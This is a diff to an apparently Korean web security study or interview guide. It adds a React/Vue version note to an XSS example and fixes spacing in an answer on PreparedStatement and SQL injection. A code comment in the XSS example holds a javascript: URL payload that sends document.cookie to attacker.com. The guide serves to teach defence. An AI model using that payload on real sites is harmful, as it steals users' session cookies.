@@ -121,7 +121,7 @@ React·Vue는 기본적으로 값을 이스케이프하지만 우회로가 두 �
 
 // 안티패턴 2: 이스케이프와 무관한 자리 — URL 스킴
 <a href={user.website}>홈페이지</a>
-// website가 "javascript:fetch('https://attacker.com?c='+document.cookie)" 이면 클릭 시 실행된다
+// website가 "javascript:fetch('https://attacker.com?c='+document.cookie)" 이면 클릭 시 실행된다 (React 18 이하. React 19는 javascript: URL을 차단하지만 Vue 등은 막지 않는다)
 // 개선: new URL(raw, location.origin)로 파싱해 protocol이 http/https일 때만 통과시킨다
 ```
 
@@ -370,7 +370,7 @@ A. 세 가지가 동시에 필요합니다. 브라우저가 자격 증명을 자
 **Q. PreparedStatement가 왜 근본적인 해결책인가요?**
 
 A. 이스케이프는 "위험한 문자를 안전하게 바꾸는" 접근이라 DB 제품과 인코딩마다 규칙이 달라지고, 숫자 컬럼처럼 따옴표가 없는 자리에서는 무력합니다. PreparedStatement는 `?` 자리표시자가 있는 상태로 DB가 먼저 구문을 파싱하고 실행 계획까지 세운 뒤에 값을 바인딩합니다. 파싱이 이미 끝났으니 값이 아무리 SQL 문법처럼 생겨도 파스 트리를 바꿀 수 없습니다. 데이터와 코드를 **문자열 수준이 아니라 처리 단계 수준에서 분리**하는 것이 핵심입니다.
-- 꼬리 질문: "그럼 SQL Injection이 완전히 사라지나요?" → 값에 대해서는 그렇습니다. 하지만 테이블명·컬럼명· 정렬 방향은 바인딩할 수 없어 화이트리스트가 필요하고, MyBatis `${}`와 JPQL 문자열 조립도 위험합니다.
+- 꼬리 질문: "그럼 SQL Injection이 완전히 사라지나요?" → 값에 대해서는 그렇습니다. 하지만 테이블명·컬럼명·정렬 방향은 바인딩할 수 없어 화이트리스트가 필요하고, MyBatis `${}`와 JPQL 문자열 조립도 위험합니다.
 
 **Q. XSS와 CSRF 중 어느 쪽이 더 위험한가요?**
 
